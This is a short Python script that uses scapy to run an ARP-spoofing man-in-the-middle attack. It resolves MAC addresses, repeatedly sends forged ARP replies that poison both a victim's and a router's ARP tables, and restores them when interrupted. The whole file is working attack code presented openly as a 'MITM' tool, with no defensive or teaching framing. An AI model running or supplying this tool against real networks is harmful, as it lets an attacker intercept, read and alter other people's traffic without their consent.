import time
import sys
import scapy.all as scapy
from termcolor import colored
 
# Function to get MAC address of a target IP
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

# Function to perform ARP spoofing (manual alternative to arp_mitm)
def spoof(target_ip, spoof_ip, interface):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"[!] Could not get MAC address for {target_ip}. Skipping...")
        return

    attacker_mac = scapy.get_if_hwaddr(interface)  # Get attacker's MAC address

    packet = scapy.Ether(dst=target_mac) / scapy.ARP(
        op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac
    )

    scapy.sendp(packet, verbose=False)
    print(f"[+] Spoofed ARP Reply Sent: {spoof_ip} is-at {attacker_mac} -> {target_ip}")

# Function to restore original ARP table
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)

    if destination_mac is None or source_mac is None:
        print(f"[!] Could not restore ARP table for {destination_ip} <-> {source_ip}.")
        return

    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
    print(f"[+] Restored ARP Table: {source_ip} is-at {source_mac} -> {destination_ip}")

# Run MITM Attack Loop
def run(router_ip, target_ip, interface):
    print(colored("🟢 [ M I T M  A C T I V E ] 🟢", "green", attrs=["bold", "blink", "reverse"]))

    try:
        while True:
            spoof(target_ip, router_ip, interface)  # Spoof Victim
            spoof(router_ip, target_ip, interface)  # Spoof Router
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] CTRL+C Detected. Restoring ARP tables...")
        restore(target_ip, router_ip)
        restore(router_ip, target_ip)
        print("\n[+] ARP Tables Restored. Exiting...")
        sys.exit(2)
